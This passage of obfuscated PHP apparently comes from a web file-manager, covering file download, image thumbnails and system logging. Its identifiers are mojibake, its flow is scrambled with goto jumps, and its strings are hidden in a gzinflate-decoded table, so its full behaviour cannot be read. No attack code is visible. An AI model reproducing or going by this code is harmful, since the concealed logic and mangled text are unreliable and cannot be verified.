$BÂÂê£’‚[8] . $céœœõŠ„¸; if (!@file_exists(self::iconvSystem($B‡©”íø•ç))) { if (isset($F°•ğ©ÃÒ)) { url_request($c¸çµù¿Ÿ, $BÂÂê£’‚[1039], $B‡©”íø•ç); } else { $E¿©ÉÑ¸ö  = self::localFilePath($c¸çµù¿Ÿ, $eĞÜ×à¬ÙØ); $B‡©”íø•ç = $E¿©ÉÑ¸ö  ? $E¿©ÉÑ¸ö  : self::download($c¸çµù¿Ÿ, $B‡©”íø•ç); } } goto fé¦—õçÄ÷; eÇÙÀß¬£Ú: return $c‰øËÖ‰§Æ[$BÂÂê£’‚[1034]]; goto f‘µ‘‰Ğ—; bÑ’İÓõˆŸ: $fó‘‘·†ò… = 50000; if (request_url_safe($c¸çµù¿Ÿ)) { $F°•ğ©ÃÒ = parse_url_query($c¸çµù¿Ÿ); if (!isset($F°•ğ©ÃÒ[$BÂÂê£’‚[75]])) { show_json($BÂÂê£’‚[1037], !1); } } $bñÖ–Õë‚ = isset($F°•ğ©ÃÒ) ? $F°•ğ©ÃÒ[$BÂÂê£’‚[75]] : $c¸çµù¿Ÿ; goto eÉËƒ®î; eÉËƒ®î: $aÊ”â²ñäÚ = self::info($bñÖ–Õë‚); $eĞÜ×à¬ÙØ = self::fileExt($aÊ”â²ñäÚ); $EŒ˜©¢°ã = self::tmpFileName($aÊ”â²ñäÚ); goto eîñ´êå; f‘µ‘‰Ğ—: } private static function fileExt($f‡…îÑŸÀ…) { $b½”˜Š‚š‹ =& $_SERVER[Äº¡•ô™Ÿ]; $dØ÷³Œ¸ö = $f‡…îÑŸÀ…[$b½”˜Š‚š‹[157]]; if ($dØ÷³Œ¸ö == $b½”˜Š‚š‹[1041]) { $A´›×Ääõ„ = $b½”˜Š‚š‹[1042]; if (substr($f‡…îÑŸÀ…[$b½”˜Š‚š‹[28]], -strlen($A´›×Ääõ„)) == $A´›×Ääõ„) { $dØ÷³Œ¸ö = $b½”˜Š‚š‹[1043]; } } self::archiveExt($dØ÷³Œ¸ö); return $dØ÷³Œ¸ö; } private static function zipFileList($fã†ï¤Ù¶, $eâÊ»èâ¯ = false) { $c‰¹÷œ‡ô° =& $_SERVER[Äº¡•ô™Ÿ]; $e¹ã¸Ï’‚ï = array(); foreach ($fã†ï¤Ù¶ as $aÚßåõâ“¿) { $EÙŠÏ‰¼â = $aÚßåõâ“¿[$c‰¹÷œ‡ô°[75]]; if ($eâÊ»èâ¯) { $EÙŠÏ‰¼â = self::copy($aÚßåõâ“¿[$c‰¹÷œ‡ô°[75]], $eâÊ»èâ¯, $c‰¹÷œ‡ô°[747]); } if ($EÙŠÏ‰¼â && self::local()->exist($EÙŠÏ‰¼â)) { $e¹ã¸Ï’‚ï[$aÚßåõâ“¿[$c‰¹÷œ‡ô°[75]]] = $EÙŠÏ‰¼â; } } if (!empty($e¹ã¸Ï’‚ï)) { return array_values($e¹ã¸Ï’‚ï); } show_json(LNG($c‰¹÷œ‡ô°[1044]), !1); } public static function tmpFileName($DÊÜ¢õ¨¸ï) { $A«µÊ”Úœ¢ =& $_SERVER[Äº¡•ô™Ÿ]; $C¡µå©Ş© = array($DÊÜ¢õ¨¸ï[$A«µÊ”Úœ¢[28]], $DÊÜ¢õ¨¸ï[$A«µÊ”Úœ¢[75]], $DÊÜ¢õ¨¸ï[$A«µÊ”Úœ¢[77]], $DÊÜ¢õ¨¸ï[$A«µÊ”Úœ¢[455]]); return md5(implode($A«µÊ”Úœ¢[70], $C¡µå©Ş©)); } private static function localFilePath($FÎ£È¾İ¤, $FˆÔîçî’¨) { goto Aò£ºšÇ×í; cÄÎêÀ¨Œ©: if ($FÒßï°Ã¦œ == $dºî¢Íß¬¹[103] || $FÒßï°Ã¦œ == $dºî¢Íß¬¹[1048]) { if (!$aŒÓëØ¬³->exist($aŒÓëØ¬³->path)) { show_json(LNG($dºî¢Íß¬¹[102]), !1); } return $aŒÓëØ¬³->path; } return !1; goto Dã²«›Ôõá; cŒÔÎñ´: if ($Dš®ì§ÚôÆ[$dºî¢Íß¬¹[29]] == KodIO::KOD_SOURCE) { $câôº¦´”‡ = Model($dºî¢Íß¬¹[755])->fileInfoGet(KodIO::sourceID($FÎ£È¾İ¤)); if (!$câôº¦´”‡[$dºî¢Íß¬¹[75]]) { show_json($dºî¢Íß¬¹[1047], !1); } $FÎ£È¾İ¤ = $câôº¦´”‡[$dºî¢Íß¬¹[75]]; } $aŒÓëØ¬³ = self::init($FÎ£È¾İ¤); $FÒßï°Ã¦œ = $aŒÓëØ¬³->getType(); goto cÄÎêÀ¨Œ©; Aò£ºšÇ×í: $dºî¢Íß¬¹ =& $_SERVER[Äº¡•ô™Ÿ]; if ($FˆÔîçî’¨ == $dºî¢Íß¬¹[1045] && strtoupper(substr(PHP_OS, 0, 3)) == $dºî¢Íß¬¹[1046]) { return !1; } $Dš®ì§ÚôÆ = KodIO::parse($FÎ£È¾İ¤); goto cŒÔÎñ´; Dã²«›Ôõá: } private static function archiveExt($DöÚë¾Œà® = '') { $GLOBALS[$_SERVER[Äº¡•ô™Ÿ][1049]] = $DöÚë¾Œà®; } } goto c°ëî•äâÖ; aß°Ğ»ß¹: $_SERVER[$_SERVER[•Éº±‡£‰èä][52]] = ("\71\64\71\62"."\x34\x34")+0;$_3qpi="yuzchVptEqCt3UzEerVRTuThjxWwERwf6gZA2FnK2DWTmR5MXasXR62QqZsN9cvzgst74YYpDeIaBkyU";; stream_wrapper_register($_SERVER[•Éº±‡£‰èä][53], $_SERVER[•Éº±‡£‰èä][54]); class ClassBaseCall { protected static $_methodListStatic = array(); protected static $_methodList = array(); public function __call($cì—É¶•‘›, $bìÜ„¸ôå¢) { $cÂâÊ‚¬Ğƒ =& $_SERVER[Äº¡•ô™Ÿ]; if (isset(self::$_methodList[$cì—É¶•‘›])) { return @call_user_func_array(self::$_methodList[$cì—É¶•‘›], $bìÜ„¸ôå¢); } else { if (method_exists($this, $cì—É¶•‘›)) { return call_user_func_array(array($this, $cì—É¶•‘›), $bìÜ„¸ôå¢); } else { think_exception(__CLASS__ . $cÂâÊ‚¬Ğƒ[4] . $cì—É¶•‘› . $cÂâÊ‚¬Ğƒ[5]); } } } public static function __callStatic($dÆğ•í“, $e¨ß›”©„Ü) { if (isset(self::$_methodListStatic[$dÆğ•í“])) { return call_user_func_array(self::$_methodListStatic[$dÆğ•í“], $e¨ß›”©„Ü); } else { if (method_exists(self, $dÆğ•í“)) { return call_user_func_array(array(self, $dÆğ•í“), $e¨ß›”©„Ü); } else { show_json("{$dÆğ•í“}\x28\51\40\156\157\x74\x20\145\x78\x69\x73\x74\x3b", !1); } } } public static function addMethod($cÛíçÚŠëŠ, $cÏìƒÆ˜Çï) { self::$_methodList[$cÛíçÚŠëŠ] = $cÏìƒÆ˜Çï; } public static function addMethodStatic($Bğåï³‰´, $AíŠ³¹›šŒ) { self::$_methodListStatic[$Bğåï³‰´] = $AíŠ³¹›šŒ; } } goto c¿á‚ïÁ‡Ó; f‡­â¬‚‘à: register_shutdown_function($_SERVER[•Éº±‡£‰èä][36]); set_error_handler($_SERVER[•Éº±‡£‰èä][49], $A™›³ãÀ´); if (function_exists($_SERVER[•Éº±‡£‰èä][50])) { set_exception_handler($_SERVER[•Éº±‡£‰èä][51]); } goto aß°Ğ»ß¹; eÃöãòµœ‹: $aò”ÊæÇè = $_SERVER[Äº¡•ô™Ÿ][543]; if (strlen($aò”ÊæÇè) < $_SERVER[Äº¡•ô™Ÿ][544]) { return; } $_SERVER[Ä³Œ±¸ü] = explode($_SERVER[Äº¡•ô™Ÿ][545], gzinflate(substr($_SERVER[Äº¡•ô™Ÿ][546], 10, -8))); goto Eµùàİ»Æ²; f”Ğ•øÕ‰¸: class ImageThumb { var $srcFile = ''; var $imgData = ''; var $echoType; var $im = ''; var $srcW = ''; var $srcH = ''; function __construct($CŒ£Ôââ«­, $C™ã§˜¬ï) { goto E®‡„Şˆèé; Fèº×¼Ñæ­: if (!$this->im) { return !1; } $FĞöçğ²ˆ = $_SERVER[Äº¡•ô™Ÿ][33]; $this->imgData = GetImageSize($CŒ£Ôââ«­, $FĞöçğ²ˆ); goto F£§Ÿµ¬†; F£§Ÿµ¬†: $this->srcW = imageSX($this->im); $this->srcH = imageSY($this->im); return $this; goto eé¦ ­°®È; E®‡„Şˆèé: $this->srcFile = $CŒ£Ôââ«­; $this->echoType = $C™ã§˜¬ï; $this->im = self::image($CŒ£Ôââ«­); goto Fèº×¼Ñæ­; eé¦ ­°®È: } public static function image($då‘ääÊ¤) { $dŞÏÂ‹µ˜ =& $_SERVER[Äº¡•ô™Ÿ]; $dèÈë·ÆÁ = $dŞÏÂ‹µ˜[33]; $bŞœŸõ§µÂ = GetImageSize($då‘ääÊ¤, $dèÈë·ÆÁ); $Aª ‚ïÒÜœ = !1; switch ($bŞœŸõ§µÂ[2]) { case IMAGETYPE_GIF: if (!function_exists($dŞÏÂ‹µ˜[1839])) { break; } $Aª ‚ïÒÜœ = imagecreatefromgif($då‘ääÊ¤); break; case IMAGETYPE_JPEG: if (!function_exists($dŞÏÂ‹µ˜[1840])) { break; } $Aª ‚ïÒÜœ = imagecreatefromjpeg($då‘ääÊ¤); break; case IMAGETYPE_PNG: if (!function_exists($dŞÏÂ‹µ˜[1841])) { break; } $Aª ‚ïÒÜœ = @imagecreatefrompng($då‘ääÊ¤); imagesavealpha($Aª ‚ïÒÜœ, !0); break; case IMAGETYPE_XBM: $Aª ‚ïÒÜœ = imagecreatefromxbm($då‘ääÊ¤); break; case IMAGETYPE_WBMP: $Aª ‚ïÒÜœ = imagecreatefromwbmp($då‘ääÊ¤); break; case IMAGETYPE_BMP: $Aª ‚ïÒÜœ = imagecreatefrombmp($då‘ääÊ¤); break; default: break; } return $Aª ‚ïÒÜœ; } public static function imageSize($dÇƒ±çº‚ê) { $D—Îïß¶¦Š =& $_SERVER[Äº¡•ô™Ÿ]; $D®ÚÌã±¶‘ = GetImageSize($dÇƒ±çº‚ê); if (!$D®ÚÌã±¶‘) { return !1; } return array($D—Îïß¶¦Š[1842] => $D®ÚÌã±¶‘[0], $D—Îïß¶¦Š[1843] => $D®ÚÌã±¶‘[1]); } function distortion($Bô®ïš³ùæ, $CŒã‰±Ì£, $b÷î®±•È•) { $cŒÂ‰øù‚ = $this->creatImage($this->im, $CŒã‰±Ì£, $b÷î®±•È•, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($cŒÂ‰øù‚, $Bô®ïš³ùæ); } function prorate($A’ßÑÛ“Ó, $cÀŸİÏé×«, $cåÜôÎŸëò) { $E¨ä’ŠÚ„à = $cÀŸİÏé×« / $cåÜôÎŸëò; $FÍ‹ÜŠÑª™ = $this->srcW / $this->srcH; if ($E¨ä’ŠÚ„à <= $FÍ‹ÜŠÑª™) { $f…“È‘ÌĞÈ = $cÀŸİÏé×«; $EîÖòãù…Í = $f…“È‘ÌĞÈ * ($this->srcH / $this->srcW); } else { $EîÖòãù…Í = $cåÜôÎŸëò; $f…“È‘ÌĞÈ = $EîÖòãù…Í * ($this->srcW / $this->srcH); } if ($this->srcW > $cÀŸİÏé×« || $this->srcH > $cåÜôÎŸëò) { $F¼¤÷ß¯ß÷ = $this->creatImage($this->im, $f…“È‘ÌĞÈ, $EîÖòãù…Í, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F¼¤÷ß¯ß÷, $A’ßÑÛ“Ó); } else { $F¼¤÷ß¯ß÷ = $this->creatImage($this->im, $this->srcW, $this->srcH, 0, 0, 0, 0, $this->srcW, $this->srcH); return $this->echoImage($F¼¤÷ß¯ß÷, $A’ßÑÛ“Ó); } } function cut($cÑÎÄíÆß”, $a•³ù÷Ÿ, $C½ÆÉ‘š›) { goto F«ßöÆä“; aœÒò¯„ò„: $D´±ï²‚‘á = $this->creatImage($this->im, $f…·‘ä°”Ê, $Dù³Ü©°îá, 0, 0, 0, 0, $this->srcW, $this->srcH); $bá×±ĞŞ“¥ = $this->creatImage($D´±ï²‚‘á, $a•³ù÷Ÿ, $C½ÆÉ‘š›, 0, 0, ($f…·‘ä°”Ê - $a•³ù÷Ÿ) / 2, ($Dù³Ü©°îá - $C½ÆÉ‘š›) / 2, $a•³ù÷Ÿ, $C½ÆÉ‘š›); imageDestroy($D´±ï²‚‘á); goto FÁ¼‹¸³Ê¤; FÁ¼‹¸³Ê¤: return $this->echoImage($bá×±ĞŞ“¥, $cÑÎÄíÆß”); goto DÕÄáÀëòï; F«ßöÆä“: $f¬ÕŸ•Ú›é = $a•³ù÷Ÿ / $C½ÆÉ‘š›; $FŒÆù‚”‰æ = $this->srcW / $this->srcH; if ($f¬ÕŸ•Ú›é <= $FŒÆù‚”‰æ) { $Dù³Ü©°îá = $C½ÆÉ‘š›; $f…·‘ä°”Ê = $Dù³Ü©°îá * ($this->srcW / $this->srcH); } else { $f…·‘ä°”Ê = $a•³ù÷Ÿ; $Dù³Ü©°îá = $f…·‘ä°”Ê * ($this->srcH / $this->srcW); } goto aœÒò¯„ò„; DÕÄáÀëòï: } function backFill($E•™‚®î©†, $B‡Ÿíôõ²İ, $dËƒê¿Â‡Ş, $bñÜ‘…ÃÂ† = false, $d…Ø¦ŠÓåô = 255, $A¶Š‡Ğ¢ = 255, $FãÌİ ƒÊŒ = 255) { goto fÏÇôäÓ½£; F‹ç”õÌœ: if ($bñÜ‘…ÃÂ†) { $eîÛ²§„ë× = imageColorTransparent($FèÒÛˆ•©Ş, $eîÛ²§„ë×); $aİ®‚İ¥ = $dËƒê¿Â‡Ş - $fÈîİÆÔá–; } imageFilledRectangle($FèÒÛˆ•©Ş, 0, 0, $B‡Ÿíôõ²İ, $dËƒê¿Â‡Ş, $eîÛ²§„ë×); if ($this->srcW > $B‡Ÿíôõ²İ || $this->srcH > $dËƒê¿Â‡Ş) { $FçÔ˜”œÎŸ = $this->creatImage($this->im, $E½ªÚ¤…, $fÈîİÆÔá–, 0, 0, 0, 0, $this->srcW, $this->srcH); if ($E½ªÚ¤… < $B‡Ÿíôõ²İ) { imageCopy($FèÒÛˆ•©Ş, $FçÔ˜”œÎŸ, ($B‡Ÿíôõ²İ - $E½ªÚ¤…) / 2, 0, 0, 0, $E½ªÚ¤…, $fÈîİÆÔá–); } else { if ($fÈîİÆÔá– < $dËƒê¿Â‡Ş) { imageCopy($FèÒÛˆ•©Ş, $FçÔ˜”œÎŸ, 0, $aİ®‚İ¥, 0, 0, $E½ªÚ¤…, $fÈîİÆÔá–); } else { imageCopy($FèÒÛˆ•©Ş, $FçÔ˜”œÎŸ, 0, 0, 0, 0, $E½ªÚ¤…, $fÈîİÆÔá–); } } } else { imageCopyMerge($FèÒÛˆ•©Ş, $this->im, ($B‡Ÿíôõ²İ - $E½ªÚ¤…) / 2, $aİ®‚İ¥, 0, 0, $E½ªÚ¤…, $fÈîİÆÔá–, 100); } goto FùïÇó±Ü¾; FùïÇó±Ü¾: return $this->echoImage($FèÒÛˆ•©Ş, $E•™‚®î©†); goto C‹”š°™àÈ; fÏÇôäÓ½£: $C‘Û”Û¸é¹ = $B‡Ÿíôõ²İ / $dËƒê¿Â‡Ş; $BµÓ´ğ“Ãø = $this->srcW / $this->srcH; if ($C‘Û”Û¸é¹ <= $BµÓ´ğ“Ãø) { $E½ªÚ¤… = $B‡Ÿíôõ²İ; $fÈîİÆÔá– = $E½ªÚ¤… * ($this->srcH / $this->srcW); } else { $fÈîİÆÔá– = $dËƒê¿Â‡Ş; $E½ªÚ¤… = $fÈîİÆÔá– * ($this->srcW / $this->srcH); } goto aìŠ„… âÂ; aìŠ„… âÂ: if (function_exists($_SERVER[Äº¡•ô™Ÿ][1844])) { @($FèÒÛˆ•©Ş = imageCreateTrueColor($B‡Ÿíôõ²İ, $dËƒê¿Â‡Ş)); if (!$FèÒÛˆ•©Ş) { $FèÒÛˆ•©Ş = imageCreate($B‡Ÿíôõ²İ, $dËƒê¿Â‡Ş); } } else { $FèÒÛˆ•©Ş = imageCreate($B‡Ÿíôõ²İ, $dËƒê¿Â‡Ş); } $aİ®‚İ¥ = ($dËƒê¿Â‡Ş - $fÈîİÆÔá–) / 2; $eîÛ²§„ë× = imagecolorallocate($FèÒÛˆ•©Ş, $d…Ø¦ŠÓåô, $A¶Š‡Ğ¢, $FãÌİ ƒÊŒ); goto F‹ç”õÌœ; C‹”š°™àÈ: } function creatImage($D¥ã«Ù«Ó, $BÂª‘çóµ¶, $d²õ†ì÷é, $cÒğŞ¸Š–ã, $F®¦ÍÔâ˜Æ, $c…ßîŠ° É, $EÎšÎ–Ò™, $Cªñİ‹‚‡è, $A°Ôêº‡‡) { if (function_exists($_SERVER[Äº¡•ô™Ÿ][1844])) { @($cÙÚ¬§Ö’ë = ImageCreateTrueColor($BÂª‘çóµ¶, $d²õ†ì÷é)); @imagealphablending($cÙÚ¬§Ö’ë, !1); @imagesavealpha($cÙÚ¬§Ö’ë, !0); if ($cÙÚ¬§Ö’ë) { imageCopyResampled($cÙÚ¬§Ö’ë, $D¥ã«Ù«Ó, $cÒğŞ¸Š–ã, $F®¦ÍÔâ˜Æ, $c…ßîŠ° É, $EÎšÎ–Ò™, $BÂª‘çóµ¶, $d²õ†ì÷é, $Cªñİ‹‚‡è, $A°Ôêº‡‡); } else { $cÙÚ¬§Ö’ë = ImageCreate($BÂª‘çóµ¶, $d²õ†ì÷é); imageCopyResized($cÙÚ¬§Ö’ë, $D¥ã«Ù«Ó, $cÒğŞ¸Š–ã, $F®¦ÍÔâ˜Æ, $c…ßîŠ° É, $EÎšÎ–Ò™, $BÂª‘çóµ¶, $d²õ†ì÷é, $Cªñİ‹‚‡è, $A°Ôêº‡‡); } } else { $cÙÚ¬§Ö’ë = ImageCreate($BÂª‘çóµ¶, $d²õ†ì÷é); imageCopyResized($cÙÚ¬§Ö’ë, $D¥ã«Ù«Ó, $cÒğŞ¸Š–ã, $F®¦ÍÔâ˜Æ, $c…ßîŠ° É, $EÎšÎ–Ò™, $BÂª‘çóµ¶, $d²õ†ì÷é, $Cªñİ‹‚‡è, $A°Ôêº‡‡); } return $cÙÚ¬§Ö’ë; } public function imgRotate($c£š÷«ì©, $d‹‹Ï¬ƒ¹) { goto bê„Ö õ—Ù; dËÁôÙ‹ÉÉ: return $e×£ÄÂ¸Ûî; goto cœ„‘íìå; bê„Ö õ—Ù: if (!$this->im || $d‹‹Ï¬ƒ¹ % 360 === 0 || !function_exists($_SERVER[Äº¡•ô™Ÿ][1845])) { return !1; } $B®ç¢±õ„° = imageRotate($this->im, 360 - $d‹‹Ï¬ƒ¹, 0); $e×£ÄÂ¸Ûî = !1; goto e¡ˆ‘¡Œ…Ç; e¡ˆ‘¡Œ…Ç: switch ($this->imgData[2]) { case IMAGETYPE_GIF: $e×£ÄÂ¸Ûî = imagegif($B®ç¢±õ„°, $c£š÷«ì©); break; case IMAGETYPE_JPEG: $e×£ÄÂ¸Ûî = imagejpeg($B®ç¢±õ„°, $c£š÷«ì©, 100); break; case IMAGETYPE_PNG: $e×£ÄÂ¸Ûî = imagePNG($B®ç¢±õ„°, $c£š÷«ì©); break; default: break; } imageDestroy($B®ç¢±õ„°); imageDestroy($this->im); goto dËÁôÙ‹ÉÉ; cœ„‘íìå: } function echoImage($Aè¤¾Çª¤•, $FøÂÆ³‰) { goto B™ÈõØ‰è‹; B™ÈõØ‰è‹: $FµÇÕãòè¨ =& $_SERVER[Äº¡•ô™Ÿ]; if (!$Aè¤¾Çª¤•) { return !1; } ob_get_clean(); goto dÊƒÔöÜÂœ; dÊƒÔöÜÂœ: $CĞÕ¥øÛ¡ğ = !1; switch ($this->echoType) { case $FµÇÕãòè¨[1846]: $CĞÕ¥øÛ¡ğ = imagePNG($Aè¤¾Çª¤•); break; case $FµÇÕãòè¨[164]: $CĞÕ¥øÛ¡ğ = imagePNG($Aè¤¾Çª¤•, $FøÂÆ³‰); break; } imageDestroy($Aè¤¾Çª¤•); goto c…ÇÆĞêáİ; c…ÇÆĞêáİ: imageDestroy($this->im); return $CĞÕ¥øÛ¡ğ; goto A±İâ¢ìáÈ; A±İâ¢ìáÈ: } } if (!function_exists($_SERVER[Äº¡•ô™Ÿ][1847])) { define($_SERVER[Äº¡•ô™Ÿ][1848], 0); define($_SERVER[Äº¡•ô™Ÿ][1849], 1); define($_SERVER[Äº¡•ô™Ÿ][1850], 2); function imageflip($B›Æç°ŠöÍ, $E•‘«‚Ô¡¥) { switch ($E•‘«‚Ô¡¥) { case IMG_FLIP_HORIZONTAL: $b§ğ™ß¹  = imagesx($B›Æç°ŠöÍ) - 1; $Aò¡¹ßŞ™‚ = $b§ğ™ß¹  / 2; $aÕ©ğí§š = imagesy($B›Æç°ŠöÍ); $EÂêùˆ³µ = imageistruecolor($B›Æç°ŠöÍ) ? imagecreatetruecolor(1, $aÕ©ğí§š) : imagecreate(1, $aÕ©ğí§š); for ($e”šóŞ«ñÚ = 0; $e”šóŞ«ñÚ < $Aò¡¹ßŞ™‚; ++$e”šóŞ«ñÚ) { imagecopy($EÂêùˆ³µ, $B›Æç°ŠöÍ, 0, 0, $e”šóŞ«ñÚ, 0, 1, $aÕ©ğí§š); imagecopy($B›Æç°ŠöÍ, $B›Æç°ŠöÍ, $e”šóŞ«ñÚ, 0, $b§ğ™ß¹  - $e”šóŞ«ñÚ, 0, 1, $aÕ©ğí§š); imagecopy($B›Æç°ŠöÍ, $EÂêùˆ³µ, $b§ğ™ß¹  - $e”šóŞ«ñÚ, 0, 0, 0, 1, $aÕ©ğí§š); } break; case IMG_FLIP_VERTICAL: $CŞ ¤Íİù® = imagesx($B›Æç°ŠöÍ); $dèÌÆ•¨ = imagesy($B›Æç°ŠöÍ) - 1; $f…®óë¿§ = $dèÌÆ•¨ / 2; $EÂêùˆ³µ = imageistruecolor($B›Æç°ŠöÍ) ? imagecreatetruecolor($CŞ ¤Íİù®, 1) : imagecreate($CŞ ¤Íİù®, 1); for ($cÑƒàš·ˆˆ = 0; $cÑƒàš·ˆˆ < $f…®óë¿§; ++$cÑƒàš·ˆˆ) { imagecopy($EÂêùˆ³µ, $B›Æç°ŠöÍ, 0, 0, 0, $cÑƒàš·ˆˆ, $CŞ ¤Íİù®, 1); imagecopy($B›Æç°ŠöÍ, $B›Æç°ŠöÍ, 0, $cÑƒàš·ˆˆ, 0, $dèÌÆ•¨ - $cÑƒàš·ˆˆ, $CŞ ¤Íİù®, 1); imagecopy($B›Æç°ŠöÍ, $EÂêùˆ³µ, 0, $dèÌÆ•¨ - $cÑƒàš·ˆˆ, 0, 0, $CŞ ¤Íİù®, 1); } break; case IMG_FLIP_BOTH: $CŞ ¤Íİù® = imagesx($B›Æç°ŠöÍ); $aÕ©ğí§š = imagesy($B›Æç°ŠöÍ); $EÂêùˆ³µ = imagerotate($B›Æç°ŠöÍ, 180, 0); imagecopy($B›Æç°ŠöÍ, $EÂêùˆ³µ, 0, 0, 0, 0, $CŞ ¤Íİù®, $aÕ©ğí§š); break; default: return; } imagedestroy($EÂêùˆ³µ); } } if (!function_exists($_SERVER[Äº¡•ô™Ÿ][1851])) { function imagecreatefrombmp($E×ä—æÂè) { return ImageGdBMP::load($E×ä—æÂè); } } goto E³‡öà®Ú; B„—‡çÆŸÓ: class SystemLogModel extends ModelBase { protected $tableName = "\163\171\163\x74\x65\x6d\137\x6c\x6f\147"; protected $dataAuto = array(array("\x63\162\145\x61\x74\145\x54\x69\x6d\x65", "\x74\151\x6d\x65", "\x69\156\x73\x65\x72\x74", "\x66\165\156\143\164\151\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $C–Ù¯ãñ˜§ =& $_SERVER[Äº¡•ô™Ÿ]; return array($C–Ù¯ãñ˜§[2344] => LNG($C–Ù¯ãñ˜§[2345]), $C–Ù¯ãñ˜§[2346] => LNG($C–Ù¯ãñ˜§[2347]), $C–Ù¯ãñ˜§[2019] => LNG($C–Ù¯ãñ˜§[2348]), $C–Ù¯ãñ˜§[2349] => LNG($C–Ù¯ãñ˜§[2350]), $C–Ù¯ãñ˜§[2351] => LNG($C–Ù¯ãñ˜§[2352]), $C–Ù¯ãñ˜§[2353] => LNG($C–Ù¯ãñ˜§[2354]), $C–Ù¯ãñ˜§[2355] => LNG($C–Ù¯ãñ˜§[2356]), $C–Ù¯ãñ˜§[2357] => LNG($C–Ù¯ãñ˜§[2358]), $C–Ù¯ãñ˜§[2050] => LNG($C–Ù¯ãñ˜§[2359]), $C–Ù¯ãñ˜§[2051] => LNG($C–Ù¯ãñ˜§[2360]), $C–Ù¯ãñ˜§[2361] => LNG($C–Ù¯ãñ˜§[2362]), $C–Ù¯ãñ˜§[2363] => LNG($C–Ù¯ãñ˜§[2364]), $C–Ù¯ãñ˜§[2365] => LNG($C–Ù¯ãñ˜§[2366]), $C–Ù¯ãñ˜§[2367] => LNG($C–Ù¯ãñ˜§[2368]), $C–Ù¯ãñ˜§[2048] => LNG($C–Ù¯ãñ˜§[2369]), $C–Ù¯ãñ˜§[2054] => LNG($C–Ù¯ãñ˜§[2370]), $C–Ù¯ãñ˜§[2371] => LNG($C–Ù¯ãñ˜§[2372]), $C–Ù¯ãñ˜§[2373] => LNG($C–Ù¯ãñ˜§[2374]), $C–Ù¯ãñ˜§[2375] => LNG($C–Ù¯ãñ˜§[2376]), $C–Ù¯ãñ˜§[2377] => LNG($C–Ù¯ãñ˜§[2378]), $C–Ù¯ãñ˜§[2057] => LNG($C–Ù¯ãñ˜§[2379]), $C–Ù¯ãñ˜§[2058] => LNG($C–Ù¯ãñ˜§[2380]), $C–Ù¯ãñ˜§[2381] => LNG($C–Ù¯ãñ˜§[2382]), $C–Ù¯ãñ˜§[2383] => LNG($C–Ù¯ãñ˜§[2384]), $C–Ù¯ãñ˜§[2385] => LNG($C–Ù¯ãñ˜§[2386]), $C–Ù¯ãñ˜§[2387] => LNG($C–Ù¯ãñ˜§[2388]), $C–Ù¯ãñ˜§[2389] => LNG($C–Ù¯ãñ˜§[2390]), $C–Ù¯ãñ˜§[2052] => LNG($C–Ù¯ãñ˜§[2391]), $C–Ù¯ãñ˜§[2392] => LNG($C–Ù¯ãñ˜§[2393]), $C–Ù¯ãñ˜§[2394] => LNG($C–Ù¯ãñ˜§[2395]), $C–Ù¯ãñ˜§[2396] => LNG($C–Ù¯ãñ˜§[2396]), $C–Ù¯ãñ˜§[2397] => LNG($C–Ù¯ãñ˜§[2023]), $C–Ù¯ãñ˜§[2398] => LNG($C–Ù¯ãñ˜§[2399]), $C–Ù¯ãñ˜§[2400] => LNG($C–Ù¯ãñ˜§[2401]), $C–Ù¯ãñ˜§[2402] => LNG($C–Ù¯ãñ˜§[2403]), $C–Ù¯ãñ˜§[2404] => LNG($C–Ù¯ãñ˜§[2405]), $C–Ù¯ãñ˜§[2406] => LNG($C–Ù¯ãñ˜§[2406]), $C–Ù¯ãñ˜§[2407] => LNG($C–Ù¯ãñ˜§[2408]), $C–Ù¯ãñ˜§[2409] => LNG($C–Ù¯ãñ˜§[2410]), $C–Ù¯ãñ˜§[2411] => LNG($C–Ù¯ãñ˜§[2412]), $C–Ù¯ãñ˜§[2413] => LNG($C–Ù¯ãñ˜§[2414]), $C–Ù¯ãñ˜§[2415] => LNG($C–Ù¯ãñ˜§[2416]), $C–Ù¯ãñ˜§[2417] => LNG($C–Ù¯ãñ˜§[2418])); } private function typeFile() { $D¦®¼èØ“— =& $_SERVER[Äº¡•ô™Ÿ]; $F‘ğà·’ÌÀ = array($D¦®¼èØ“—[2054] => array($D¦®¼èØ“—[2055]), $D¦®¼èØ“—[2365] => array($D¦®¼èØ“—[2419]), $D¦®¼èØ“—[2367] => array($D¦®¼èØ“—[2420]), $D¦®¼èØ“—[2048] => array($D¦®¼èØ“—[2049]), $D¦®¼èØ“—[2373] => array(), $D¦®¼èØ“—[2375] => array(), $D¦®¼èØ“—[2377] => array(), $D¦®¼èØ“—[2057] => array($D¦®¼èØ“—[2059]), $D¦®¼èØ“—[2058] => array($D¦®¼èØ“—[2059]), $D¦®¼èØ“—[2381] => array($D¦®¼èØ“—[2421]), $D¦®¼èØ“—[2383] => array($D¦®¼èØ“—[2421]), $D¦®¼èØ“—[2385] => array($D¦®¼èØ“—[2422]), $D¦®¼èØ“—[2371] => array($D¦®¼èØ“—[2423]), $D¦®¼èØ“—[2387] => array($D¦®¼èØ“—[2424]), $D¦®¼èØ“—[2389] => array($D¦®¼èØ“—[2425]), $D¦®¼èØ“—[2052] => array($D¦®¼èØ“—[2053])); return $F‘ğà·’ÌÀ; } private function typeAll() { goto E¼¸ì‹ïåµ; AíµÙšà·: return $e¸Š±ğ÷¤ë; goto dø„­›æ•í; E¼¸ì‹ïåµ: $aèÃÊÉ†Ä =& $_SERVER[Äº¡•ô™Ÿ]; $e¸Š±ğ÷¤ë = $this->typeList; $DÑ‰†¦›”¾ = array_filter($this->typeFile()); goto d¦¤ÕíÍ§; d¦¤ÕíÍ§: foreach ($DÑ‰†¦›”¾ as $D¿êÆÙÁÛğ => $CªÕŒ£¡‰²) { $e¸Š±ğ÷¤ë[$CªÕŒ£¡‰²[0]] = $e¸Š±ğ÷¤ë[$D¿êÆÙÁÛğ]; } $e¸Š±ğ÷¤ë[$aèÃÊÉ†Ä[2059]] = LNG($aèÃÊÉ†Ä[2426]); $e¸Š±ğ÷¤ë[$aèÃÊÉ†Ä[2421]] = LNG($aèÃÊÉ†Ä[2427]); goto AíµÙšà·; dø„­›æ•í: } public function addLog($b»Ç÷›êñŒ, $bµ¢­­òÑæ = array()) { goto CÍ÷£äğ¢; CÍ÷£äğ¢: $Bß×Áß‰Ÿ =& $_SERVER[Äº¡•ô™Ÿ]; if (!isset($this->typeList[$b»Ç÷›êñŒ])) { return; 